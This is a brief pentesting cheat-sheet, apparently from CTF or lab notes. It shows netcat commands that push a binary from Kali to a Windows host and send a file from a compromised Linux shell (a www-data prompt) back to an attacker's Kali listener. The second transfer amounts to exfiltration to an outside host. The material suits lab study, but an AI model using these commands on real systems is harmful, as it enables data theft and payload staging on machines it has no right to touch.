# File transfer from Kali to Windows using netcat
(Sender) Kali ====> Windows (Receiver) 
``` 
nc.exe -nlvp 443 > C:\binary.exe 
``` 
``` 
nc -w 3 <Windows IP> 443 < binary.exe 
``` 

## File transfer from Linux to Kali

```
root@kali:~# nc -nvlp 5555 > filename

www-data@machine:/usr/local/bin$ nc 10.10.X.X 5555 < filename
```
